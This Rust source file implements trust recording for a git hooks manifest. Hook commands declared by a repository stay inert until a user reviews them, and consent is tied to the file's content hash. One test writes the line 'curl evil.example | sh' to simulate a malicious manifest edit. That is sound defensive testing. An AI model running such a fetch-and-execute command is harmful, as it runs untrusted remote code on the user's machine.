//! Whether this repository's `.githooks.conf` may run.
//!
//! `.githooks.conf` is committed, which is the point — a team shares a check by
//! committing it. The consequence is that cloning a repository and committing to
//! it would otherwise run commands that repository chose, and neither of those
//! acts is one anybody performs as a decision about trust. Reviewing a diff
//! before running it is; nothing asked for that.
//!
//! So the manifest is inert until somebody says otherwise, and the record is
//! keyed on the FILE'S CONTENT rather than its path: a `git pull` that adds a
//! command does not inherit the consent given to the file before it.
//!
//! ## Why `git hash-object` and not a hash of our own
//!
//! `githooks` links no external crates (`scripts/check-no-deps.sh`), and the
//! only hash in `std` is `DefaultHasher` — SipHash with a fixed key, which is
//! not collision-resistant and would let a crafted manifest match a trusted
//! one's fingerprint. Writing SHA-256 by hand is a hundred lines nobody would
//! review as carefully as they should.
//!
//! `git` is already a hard dependency of every path in this binary, and
//! `git hash-object` is the identity git itself uses for content. It is SHA-1
//! (or SHA-256 in a repository configured for it), which is not a strong
//! guarantee against a determined attacker with a chosen-prefix collision — but
//! it is enormously better than SipHash, costs no dependency, and a user can
//! reproduce it by hand to check what they trusted:
//!
//! ```text
//! $ git hash-object .githooks.conf
//! ```

use std::path::Path;

use crate::ui::valid_sign;

/// Where the decision is recorded. Local, never committed — a repository must
/// not be able to declare itself trusted.
pub const KEY: &str = "githooks.trusted";

/// Content id of `path`, as git would compute it.
pub fn fingerprint(repo: &Path, manifest: &Path) -> Option<String> {
    crate::git::stdout_in(repo, &["hash-object", manifest.to_str()?])
}

/// What the repository has recorded, if anything.
pub fn recorded(repo: &Path) -> Option<String> {
    crate::git::stdout_in(repo, &["config", "--local", "--get", KEY])
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum State {
    /// No manifest. The overwhelmingly common case, and it must cost nothing.
    NoManifest,
    /// Trusted, and the file still has the bytes that were trusted.
    Trusted,
    /// Never trusted here.
    Untrusted,
    /// Trusted once, and edited since. Distinct from `Untrusted` because the
    /// message should say which happened — "somebody changed it" is a different
    /// thing to tell a reader than "you have not looked at this yet".
    Changed,
}

/// Decide whether `repo`'s manifest may run.
pub fn state(repo: &Path) -> State {
    let manifest = repo.join(crate::manifest::MANIFEST);
    if !manifest.is_file() {
        return State::NoManifest;
    }
    let Some(current) = fingerprint(repo, &manifest) else {
        // Cannot compute it, so cannot claim it matches.
        return State::Untrusted;
    };
    match recorded(repo) {
        Some(seen) if seen == current => State::Trusted,
        Some(_) => State::Changed,
        None => State::Untrusted,
    }
}

/// Record the manifest as it stands now.
pub fn record(repo: &Path) -> Result<String, String> {
    let manifest = repo.join(crate::manifest::MANIFEST);
    let fp = fingerprint(repo, &manifest)
        .ok_or_else(|| format!("cannot hash {}", manifest.display()))?;
    let ok = crate::git::stdout_in(repo, &["config", "--local", KEY, &fp]).is_some();
    if !ok {
        return Err(format!("cannot record {KEY} in this repository"));
    }
    Ok(fp)
}

/// Forget it.
pub fn revoke(repo: &Path) -> Result<(), String> {
    // `--unset` exits 5 when the key is absent, which is not a failure here.
    let _ = crate::git::stdout_in(repo, &["config", "--local", "--unset", KEY]);
    Ok(())
}

/// The reason an external does not run, phrased for the check's own report.
pub fn why(state: State) -> Option<&'static str> {
    match state {
        State::NoManifest | State::Trusted => None,
        State::Untrusted => {
            Some("declared in an untrusted .githooks.conf — review it, then `githooks trust`")
        }
        State::Changed => {
            Some(".githooks.conf changed since it was trusted — review it, then `githooks trust`")
        }
    }
}

/// Show what the manifest declares, so the decision is made with it in view.
///
/// Printing the lines is the whole point: "trust this file" is not a question
/// anybody can answer without seeing it, and a prompt that does not show it is
/// a prompt that trains people to press y.
pub fn describe(repo: &Path) -> String {
    use std::fmt::Write;
    let mut out = String::new();
    for line in crate::manifest::read_lines(repo) {
        let (name, stage, parsed) = line.into_parts();
        match parsed {
            Ok(declared) => {
                let _ = writeln!(
                    out,
                    "      {name:<14} {:<10} {}",
                    stage.as_str(),
                    declared.command()
                );
            }
            Err(why) => {
                let _ = writeln!(out, "      {name:<14} {:<10} ! {why}", stage.as_str());
            }
        }
    }
    out
}

/// A yes/no on the terminal, or `false` when there is nobody to ask.
///
/// Reads `/dev/tty` rather than stdin: git hands a hook a pipe, and a prompt
/// that read stdin would consume something else's input. Same reason
/// `package-lock` does it, and the third copy of this is where it becomes a
/// shared function.
#[cfg(unix)]
pub fn confirm(prompt: &str) -> bool {
    use std::io::{BufRead, BufReader, Write};
    let Ok(tty) = std::fs::File::open("/dev/tty") else {
        return false;
    };
    print!("{prompt}");
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    if BufReader::new(tty).read_line(&mut line).is_err() {
        return false;
    }
    matches!(line.trim_start().chars().next(), Some('y') | Some('Y'))
}

/// Windows has no `/dev/tty`; treat it as nobody to ask, which declines.
#[cfg(not(unix))]
pub fn confirm(_prompt: &str) -> bool {
    false
}

/// `githooks trust [--show|--revoke]`.
pub fn command(args: &[std::ffi::OsString]) -> Result<(), String> {
    let root = crate::hooks::common::repo_root();
    let root = Path::new(&root);
    let flag = |f: &str| args.iter().any(|a| a == f);

    if flag("--revoke") {
        revoke(root)?;
        println!("{} .githooks.conf is no longer trusted here", valid_sign());
        return Ok(());
    }

    let state = state(root);
    if state == State::NoManifest {
        println!("no {} in this repository", crate::manifest::MANIFEST);
        return Ok(());
    }

    if flag("--show") {
        println!("{}", crate::manifest::MANIFEST);
        print!("{}", describe(root));
        println!(
            "    {}",
            match state {
                State::Trusted => "trusted here",
                State::Changed => "TRUSTED ONCE, AND CHANGED SINCE — not running",
                _ => "not trusted here — not running",
            }
        );
        return Ok(());
    }

    if state == State::Trusted {
        println!("{} already trusted, unchanged", valid_sign());
        return Ok(());
    }

    println!("{} declares:", crate::manifest::MANIFEST);
    print!("{}", describe(root));
    let fp = record(root)?;
    println!("{} trusted ({fp})", valid_sign());
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn repo(name: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("trust-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        std::process::Command::new("git")
            .args(["init", "-q", "--template=", "."])
            .current_dir(&d)
            .output()
            .expect("git");
        d
    }

    fn write_manifest(dir: &Path, body: &str) {
        std::fs::write(dir.join(crate::manifest::MANIFEST), body).unwrap();
    }

    /// Ninety-six repositories have no manifest. That must be free and silent.
    #[test]
    fn no_manifest_is_not_a_trust_question() {
        let d = repo("none");
        assert_eq!(state(&d), State::NoManifest);
        assert_eq!(why(State::NoManifest), None);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn a_manifest_starts_untrusted() {
        let d = repo("new");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        assert_eq!(state(&d), State::Untrusted);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn recording_makes_it_trusted() {
        let d = repo("record");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        record(&d).expect("record");
        assert_eq!(state(&d), State::Trusted);
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The property the whole design turns on: consent is to CONTENT, so a
    /// `git pull` that adds a command cannot inherit it.
    #[test]
    fn editing_the_manifest_revokes_trust() {
        let d = repo("edit");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        record(&d).expect("record");
        assert_eq!(state(&d), State::Trusted);

        write_manifest(&d, "pre-commit  a  *  block  curl evil.example | sh\n");
        assert_eq!(
            state(&d),
            State::Changed,
            "a manifest edited after trusting must not still be trusted"
        );
        // And it says which happened, because "you have not looked at this" is
        // a different sentence to "somebody changed it".
        assert!(why(State::Changed).expect("reason").contains("changed"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn revoking_returns_it_to_untrusted() {
        let d = repo("revoke");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        record(&d).expect("record");
        revoke(&d).expect("revoke");
        assert_eq!(state(&d), State::Untrusted);
        // Twice is not an error: `git config --unset` exits 5 on a missing key.
        revoke(&d).expect("revoke again");
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Reproducible by hand, which is the point of using git's own identity.
    #[test]
    fn the_fingerprint_is_git_hash_object() {
        let d = repo("fp");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        let manifest = d.join(crate::manifest::MANIFEST);
        let ours = fingerprint(&d, &manifest).expect("fingerprint");
        let theirs = String::from_utf8_lossy(
            &std::process::Command::new("git")
                .args(["hash-object", manifest.to_str().unwrap()])
                .current_dir(&d)
                .output()
                .expect("git")
                .stdout,
        )
        .trim()
        .to_string();
        assert_eq!(ours, theirs);
        let _ = std::fs::remove_dir_all(&d);
    }
}
